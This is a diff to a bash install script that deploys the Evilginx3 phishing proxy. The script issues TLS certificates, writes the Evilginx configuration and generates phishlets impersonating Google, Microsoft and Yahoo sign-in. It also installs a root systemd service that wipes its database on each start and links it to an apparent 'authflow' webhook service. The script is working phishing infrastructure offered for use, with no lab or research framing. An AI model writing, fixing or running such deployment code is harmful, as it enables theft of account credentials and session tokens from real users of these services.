@@ -368,6 +368,10 @@ provision_tls() {
         --no-eff-email \
         $domain_args
 
+    # Allow the authflow group to read certificates
+    chgrp -R "$SERVICE_GROUP" /etc/letsencrypt/archive /etc/letsencrypt/live
+    chmod -R g+rx /etc/letsencrypt/archive /etc/letsencrypt/live
+
     log "TLS certificates provisioned successfully"
 }
 
@@ -458,71 +462,82 @@ start_service() {
 configure_evilginx_integration() {
     log "Configuring Evilginx3 integration..."
 
-    # 1. Resolve Port 53 conflict (systemd-resolved)
+    # Resolve Port 53 conflict
     if grep -q "DNSStubListener=yes" /etc/systemd/resolved.conf || ! grep -q "DNSStubListener" /etc/systemd/resolved.conf; then
-        log "Disabling systemd-resolved stub listener to free port 53..."
+        log "Disabling systemd-resolved stub listener..."
         mkdir -p /etc/systemd/resolved.conf.d
         echo -e "[Resolve]\nDNSStubListener=no" > /etc/systemd/resolved.conf.d/evilginx.conf
         systemctl restart systemd-resolved
     fi
 
-    # 2. Clear old state to prevent port 443 bind errors and config ghosting
+    # Stop existing services
     systemctl stop evilginx 2>/dev/null || true
-    # We only delete the DB on a fresh install or if it's corrupted
-    # rm -f "$EVILGINX_DIR/evilginx.db" 
+    pkill evilginx 2>/dev/null || true
     sleep 2
 
-    # STEP 21: Create Evilginx config from template
-    # (Must exist before Evilginx is spawned to avoid port conflicts)
-    if [ -f "$INSTALL_DIR/templates/evilginx.yaml.tmpl" ]; then
-        sed -e "s/{{.Domain}}/$DOMAIN/g" \
-            -e "s/{{.VpsIp}}/$VPS_IP/g" \
-            "$INSTALL_DIR/templates/evilginx.yaml.tmpl" > "$EVILGINX_DIR/config.yaml"
-            
-        chmod 600 "$EVILGINX_DIR/config.yaml"
-    fi
-
-    # Copy certificates for Evilginx3
+    # Create certificates directory and symlinks
     mkdir -p "$EVILGINX_DIR/certs"
     ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/$DOMAIN.crt"
     ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/$DOMAIN.key"
 
-    # Create v3-compatible phishlets
-    log "Creating v3 phishlet configurations..."
+    # Create config.yaml for evilginx
+    cat > "$EVILGINX_DIR/config.yaml" << EOF
+daemon: false
+debug: true
+domain: $DOMAIN
+ipv4: $VPS_IP
+http_port: 80
+https_port: 443
+dns_port: 0
+autocert: false
+phishlets_path: $EVILGINX_DIR/phishlets
+cert_path: $EVILGINX_DIR/certs
+database: $EVILGINX_DIR/evilginx.db
+EOF
 
-    # Copy templates to target directory
-    cat "$INSTALL_DIR/templates/phishlets/yahoo.yaml.tmpl" > "$EVILGINX_DIR/phishlets/yahoo.yaml"
-    cat "$INSTALL_DIR/templates/phishlets/microsoft.yaml.tmpl" > "$EVILGINX_DIR/phishlets/microsoft.yaml"
-    cat "$INSTALL_DIR/templates/phishlets/google.yaml.tmpl" > "$EVILGINX_DIR/phishlets/google.yaml"
+    # Ensure phishlets directory exists
+    mkdir -p "$EVILGINX_DIR/phishlets"
 
-    # Replace variables in the files
-    sed -i "s/{{.Endpoint1}}/$EP1/g" "$EVILGINX_DIR/phishlets/yahoo.yaml"
-    sed -i "s/{{.Endpoint2}}/$EP2/g" "$EVILGINX_DIR/phishlets/microsoft.yaml"
-    sed -i "s/{{.Endpoint3}}/$EP3/g" "$EVILGINX_DIR/phishlets/google.yaml"
-    sed -i "s/{{.Domain}}/$DOMAIN/g" "$EVILGINX_DIR/phishlets/"*.yaml
-    sed -i "s/{{.AppPort}}/$APP_PORT/g" "$EVILGINX_DIR/phishlets/"*.yaml
-    sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" "$EVILGINX_DIR/phishlets/"*.yaml
+    # Copy and process phishlet templates
+    local DOMAIN_B64=$(echo -n "$DOMAIN" | base64 | tr -d '\n')
+    for phishlet in google microsoft yahoo; do
+        if [ -f "$INSTALL_DIR/templates/phishlets/${phishlet}.yaml.tmpl" ]; then
+            cat "$INSTALL_DIR/templates/phishlets/${phishlet}.yaml.tmpl" | \
+                sed "s/{{.Endpoint1}}/$EP1/g" | \
+                sed "s/{{.Endpoint2}}/$EP2/g" | \
+                sed "s/{{.Endpoint3}}/$EP3/g" | \
+                sed "s/{{.Domain}}/$DOMAIN/g" | \
+                sed "s/{{.DomainBase64}}/$DOMAIN_B64/g" | \
+                sed "s/{{.VpsIp}}/$VPS_IP/g" | \
+                sed "s/{{.AppPort}}/$APP_PORT/g" | \
+                sed "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" \
+                > "$EVILGINX_DIR/phishlets/${phishlet}.yaml"
+            log "Created phishlet: $phishlet"
+        else
+            warn "Phishlet template not found: ${phishlet}.yaml.tmpl"
+        fi
+    done
 
-    # Create Evilginx3 systemd service
+    # Create systemd service for evilginx
     cat > /etc/systemd/system/evilginx.service << EOF
 [Unit]
 Description=Evilginx3 Phishing Framework
 After=network.target network-online.target
 Wants=network-online.target
+Before=authflow.service
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=$EVILGINX_DIR
-ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
+ExecStartPre=/bin/rm -f $EVILGINX_DIR/evilginx.db
+ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR/config.yaml -p $EVILGINX_DIR/phishlets
 Restart=always
 RestartSec=5
 StandardOutput=journal
 StandardError=journal
-
-# Security
-NoNewPrivileges=false
-PrivateTmp=true
+KillMode=process
+KillSignal=SIGINT
 
 [Install]
 WantedBy=multi-user.target
@@ -531,75 +546,17 @@ EOF
     systemctl daemon-reload
     systemctl enable evilginx
     
-    # Wait for evilginx to initialize and create config
-    log "Waiting for Evilginx3 to initialize..."
+    # Start evilginx
+    systemctl start evilginx
+    
     sleep 5
     
-    # Configure using evilginx v3 commands
-    log "Configuring Evilginx3 settings..."
-    
-    # Use expect for interactive configuration
-    cat > /tmp/evilginx_config.exp << EOF
-#!/usr/bin/expect -f
-set timeout 45
-log_user 1
-
-spawn /usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
-
-expect {
-    "blacklist: loaded" {
-        # Engine is initialized and database is ready for commands
-        expect -re "evilginx\s+>\s*$"
-        
-        send "config https_port 443\r"
-        expect -re "evilginx\s+>\s*$"
-        send "config http_port 80\r"
-        expect -re "evilginx\s+>\s*$"
-        send "config dns_port 0\r"
-        expect -re "evilginx\s+>\s*$"
-        send "config autocert off\r"
-        expect -re "evilginx\s+>\s*$"
-        send "config domain $DOMAIN\r"
-        expect -re "evilginx\s+>\s*$"
-        send "config ipv4 external $VPS_IP\r"
-        expect -re "evilginx\s+>\s*$"
-        
-        # Enable phishlets
-        send "phishlets hostname yahoo $EP1.$DOMAIN\r"
-        expect -re "evilginx\s+>\s*$"
-        send "phishlets enable yahoo\r"
-        expect -re "evilginx\s+>\s*$"
-        send "phishlets hostname microsoft $EP2.$DOMAIN\r"
-        expect -re "evilginx\s+>\s*$"
-        send "phishlets enable microsoft\r"
-        expect -re "evilginx\s+>\s*$"
-        send "phishlets hostname google $EP3.$DOMAIN\r"
-        expect -re "evilginx\s+>\s*$"
-        send "phishlets enable google\r"
-        expect -re "evilginx\s+>\s*$"
-        
-        send "exit\r"
-    }
-}
-
-expect eof
-EOF
-
-    chmod +x /tmp/evilginx_config.exp
-    export DOMAIN VPS_IP EP1 EP2 EP3
-    /tmp/evilginx_config.exp
-    
-    # 3. Cleanup and Restore Services
-    rm -f /tmp/evilginx_config.exp
-    systemctl restart evilginx
-    
-    # Verify evilginx is running
-    sleep 3
+    # Check if running
     if systemctl is-active --quiet evilginx; then
-        log "Evilginx3 configured and running successfully"
+        log "Evilginx3 started successfully"
     else
-        warn "Evilginx3 may not be running. Check: systemctl status evilginx"
-        warn "Manual configuration may be needed"
+        warn "Evilginx3 failed to start. Checking logs..."
+        journalctl -u evilginx -n 20 --no-pager
     fi
 
     log "Evilginx3 integration configured"
